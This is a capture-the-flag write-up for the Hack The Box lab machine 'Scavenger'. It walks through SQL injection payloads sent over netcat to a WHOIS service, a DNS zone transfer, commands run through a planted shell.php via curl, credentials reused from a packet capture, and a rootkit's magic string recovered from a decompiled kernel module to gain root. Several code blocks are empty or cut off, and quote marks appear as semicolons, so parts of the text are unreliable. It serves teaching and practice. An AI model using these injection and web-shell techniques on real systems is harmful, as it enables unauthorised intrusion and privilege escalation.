## Summary

Scavenger just retired today. It was a very interesting box and I had lots of fun exploiting a box that was already pwned by an (imaginary) attacker. Also, I loved the Silicon Valley theme. Its IP address is `10.10.10.155` and I added it to `/etc/hosts` as `scavenger.htb`. Without further ado, let’s jump right in!

## Scanning & Web App Enumeration

A light `nmap` scan offered me enough information to get started:

{% highlight bash %}
root@fury-battlestation:~/htb/blog/scavenger# nmap -sV -O scavenger.htb -oN scan.txt
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-01 11:16 EST

root@fury-battlestation:~/htb/blog/scavenger#

{% endhighlight %}

After reading the results, I tried to access port 80 to search for vulnerable applications. I was surprised when I got an error:

<div>
<center><img src="/images/scavenger_htb_writeup/image.png"></center>
</div>

That error seemed rather familiar to me, as I once had an issue with an app I built. Basically, `apache` (and maybe other software) has the ability to serve multiple web addresses on the same port. This application-separated hosts are called virtualhosts.

The error basically told me that I first needed to find a valid domain and point it to the box’ IP address (and, as you will see later, there are multiple valid domains). Before I started enumerating the other ports, I read the nmap report again and noticed an interesting line:

{% highlight bash %}
Service Info: Host: ib01.supersechosting.htb; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
{% endhighlight %}

I added `supersechosting.htb` to `/etc/hosts` and tried to access it in a browser:

<div>
<center><img src="/images/scavenger_htb_writeup/image-1.png"></center>
</div>

It worked! However, I wasn’t able to find anything interesting on the site, so I moved on and started enumerating the other ports.

## Finding More Domains

I knew that I should probably be looking for new domains, so I focused my energy on port 43 (WHOIS) and 53 (DNS). I found port 43 to be quite interesting, as I couldn’t find the software that was running on it:

{% highlight bash %}
root@fury-battlestation:~/htb/blog/scavenger# echo 'test' | nc scavenger.htb 43
% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
% This query returned 0 object
root@fury-battlestation:~/htb/blog/scavenger#

{% endhighlight %}

Theoretically, the word ‘query’ (and the banner that included the server’s MariaDB version) should have tipped me off that the app is vulnerable to an SQL injection, however, I have to admit that I found the vulnerability by mistake wjile testing for something else.

{% highlight bash %}
root@fury-battlestation:~/htb/blog/scavenger# echo ";" | nc scavenger.htb 43
% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ;;;;) limit 1; at line 1

{% endhighlight %}

I leveraged the new-found vulnerability and retrieved the version of database software that the server was running:

{% highlight bash %}
root@fury-battlestation:~/htb/blog/scavenger# echo ";) UNION SELECT @@version,2 #" | nc scavenger.htb 43
% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
% This query returned 1 object
10.1.37-MariaDB-0+deb9u1

{% endhighlight %}

Next, I listed all the user-created databases:

{% highlight bash %}
root@fury-battlestation:~/htb/blog/scavenger# echo ";) UNION SELECT table_name,2 from information_schema.tables WHERE table_schema not in (;information_schema;,;mysql;,;performance_schema;,;sys;) #" | nc scavenger.htb 43
% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
% This query returned 1 object
customers

{% endhighlight %}

There was only one table called `customers`, so I went further and started enumerating its columns:

{% highlight bash %}
root@fury-battlestation:~/htb/blog/scavenger# echo ";) UNION SELECT CONCAT(column_name, ; ;), 2 FROM information_schema.columns where table_name = ;customers; #" | nc scavenger.htb 43
% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
% This query returned 3 object
id domain data 

{% endhighlight %}

After that, I listed all entries of the `domain` column hoping to find new vhosts:

{% highlight bash %}
root@fury-battlestation:~/htb/blog/scavenger# echo ";) UNION SELECT CONCAT(domain, ; ;), 2 FROM customers #" | nc scavenger.htb 43
% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
% This query returned 4 object
supersechosting.htb justanotherblog.htb pwnhats.htb rentahacker.htb

{% endhighlight %}

It turned out there were 3 more domains. I tried exploiting the SQL injection further, but I had no success.

## The 3 Domains

I added the newly-discovered domains in my `/etc/hosts` file and quickly inspected all of them to see if I could find any vulnerability.

The first one, `justanotherblog.htb`, only hosted an ‘Under Construction’ page:

<div>
<center><img src="/images/scavenger_htb_writeup/image-2.png"></center>
</div>

The second one, `pwnhats.htb`, was pretty funny, as it hosted a hacker hat store named PWNHats:)
<center><img src="/images/scavenger_htb_writeup/image-3.png"></center>

<div>
<center><img src="/images/scavenger_htb_writeup/image-4.png"></center>
</div>

The last site, `rentahacker.htb`, was using a default WordPress theme and offered ‘heap hacking services’:

<div>
<center><img src="/images/scavenger_htb_writeup/image-5.png"></center>
</div>

The comment section of the last site was pretty interesting to me:

<div>
<center><img src="/images/scavenger_htb_writeup/image-6.png"></center>
</div>

In the last comment, the ‘31173 HAXXOR team’ stated that they had successfully compromised the system. They also mentioned a bug tracker, so I started searching for it, hoping to find the remains of the above-mentioned hack (the box name is ‘Scavenger for a reason 🙂 )

## DNS Enumeration & The Bug Tracker

After running dirb with multiple wordlists and extensions, I didn’t manage to find any bug tracker, so I concluded that it was hosted on another subdomain. I first tried to ask the DNS server for all the sub-domains and it worked:

{% highlight bash %}
root@fury-battlestation:~/htb/blog/scavenger# host -l rentahacker.htb ns1.supersechosting.htb
Using domain server:
Name: ns1.supersechosting.htb
Address: 10.10.10.155#53
Aliases: 

rentahacker.htb name server ns1.supersechosting.htb.
rentahacker.htb has address 10.10.10.155
mail1.rentahacker.htb has address 10.10.10.155
sec03.rentahacker.htb has address 10.10.10.155
www.rentahacker.htb has address 10.10.10.155
root@fury-battlestation:~/htb/blog/scavenger#

{% endhighlight %}

The `sec03.rentahacker.htb` sub-domain was the one defaced by the hackers:

<div>
<center><img src="/images/scavenger_htb_writeup/image-18-1024x554.png"></center>
</div>

After discovering that page, I rand dirb again, this time on the newly found sub-domain:

{% highlight bash %}

`shell.php` caught my attention immediately. I thought that attackers could have used this file to execute commands, but I didn’t know what parameter was used to pass the command. I used wfuzz to discover it:

{% highlight bash %}

When I tried supplying the `hidden` parameter to `shell.php`, the command I provided was executed and the output was returned in plaintext:

{% highlight bash %}
root@fury-battlestation:~/htb/blog/scavenger# curl "http://sec03.rentahacker.htb/shell.php?hidden=whoami;id"

It worked! However, ib01c03 does not have a `user.txt` file in ~ 🙁

## Getting user.txt

After some initial enumeration, I found an interesting mail in `/var/spool/mail/ib01c03`:

Hi, we will check when possible. We are working on another incident right now. We just make a backup of the apache logs.
Please check if there is any strange file in your web root and upload it to the ftp server:
ftp.supersechosting.htb

pass: YhgRt56_Ta

Thanks.

The ‘notes.txt’ file revealed that there was another attack that targeted another client (ib01c01):

{% highlight bash %}
root@fury-battlestation:~/htb/blog/scavenger# cat notes.txt 
After checking the logs and the network capture, all points to that the attacker knows valid credentials and abused a recently discovered vuln to gain access to the server!

{% endhighlight %}

The first lines of the ‘access.log’ file revealed that ib01c01 was the owner of ‘pwnhats.htb’:

In order to find the valid password, I simply used strings on the pcap file:

The password for ‘pwnhats@pwnhats.htb’ was ‘GetYouAH4t!’. I tried using the credentials to access the admin panel, but the dashboard was very slow. I also tried exploiting the vulnerability the attacker used, but I wasn’t able to do that either. After a lot of thinking, I tried using the same password for ib01c01’s FTP and it worked:

As always, I won’t post the user proof here; I will only say that it starts with ‘6f’.

## Finding the rootkit

After getting the user.txt file, I started searching for a privesc method, but I got stuck. After going through everything again, I found a TCP stream (tcp.stream eq 26) in the pcap file that contained some of the attacker’s commands:

Basically, the attacker downloaded some files and then upgraded his shell to a SSL-encrypted one. After some searching, I was able to locate the source code of root.c:

The source code was clearly copied from [this site](https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485). Basically, any process that would write a magic string to /dev/ttyR0 would get root privileges. However, the default string wouldn;t work, because the attacker probably changed the magic string to something else (I called it magic string because that;s how the author of the code named it; it doesn;t have anything to do with unicorns). 

I knew that I needed to get the .ko file or the modified source code in order to find the modified magic string, however, I had a very hard time doing that, mainly because I used shell.php to try and locate it. As it turned out, the file was hidden inside ib01c01;s files:

Did you see it? Read the folders again, this time more carefully. Still didn;t see it? Well, me neither. However, after reading that list a lot of times, I finally realised that ... is a user-created directory:

{% highlight bash %}

## Getting root.txt

After downloading root.ko, I opened it in ghidra and read the root_write function, which compared the data written to the character device with the magic string. You can find below a snippet of the code:

{% highlight c %}
/* WARNING: Could not reconcile some variable overlaps */

ssize_t root_write(file *f,char *buf,size_t len,loff_t *off)

{
  long lVar1;
  int iVar2;
  void *__s1;
  long lVar3;
  ulong uVar4;
  ulong extraout_RDX;
  long in_GS_OFFSET;
  char a [4];
  char b [5];
  char magic [8];
  
  __fentry__();
  lVar1 = *(long *)(in_GS_OFFSET + 0x28);
  a = 0x743367;
  b._0_4_ = 0x76317250;
  magic = 0x746f3052743067;
  b[4] = 0;
  __s1 = (void *)__kmalloc(extraout_RDX + 1,0x24000c0);
  if (__s1 == (void *)0x0) {
    printk(&DAT_00100358);
    uVar4 = extraout_RDX;
  }
  else {
    __check_object_size(__s1,extraout_RDX,0);
    _copy_from_user(__s1,buf,extraout_RDX & 0xffffffff);
    snprintf(magic,8,"%s%s",a,b);
    iVar2 = memcmp(__s1,magic,7);
    if (iVar2 == 0) {
      lVar3 = prepare_creds();
      if (lVar3 == 0) {
        printk("ttyRK: Cannot prepare credentials\n");
        uVar4 = 0;
        goto LAB_001000b9;
      }
      printk("ttyRK: You got it.\n");

{% endhighlight %}

Basically, the magic variable (which holds the magic string, duh) starts with the value 'to0Rt0g', which is g0tR0ot read backwards. However, before the comparison, it is modified to the concatenation of a and b. If a represents 't3g' and b 'v1rP', the concatenation would be 'g3tPr1v' (don't forget to read a and b backwards!). I used shell.php to execute the command that would elevate my shell's privilege:

{% highlight bash %}
root@fury-battlestation:~/htb/blog/scavenger# curl "http://sec03.rentahacker.htb/shell.php?hidden=echo%20g3tPr1v%20%3E%20/dev/ttyR0;%20id"
uid=0(root) gid=0(root) groups=0(root),1004(customers)
root@fury-battlestation:~/htb/blog/scavenger#

{% endhighlight %}

For those of you who don;t want to urldecode online, I just executed ;echo g3tPr1v > /dev/ttyR0; id;

The root flag starts with '4a' 😉
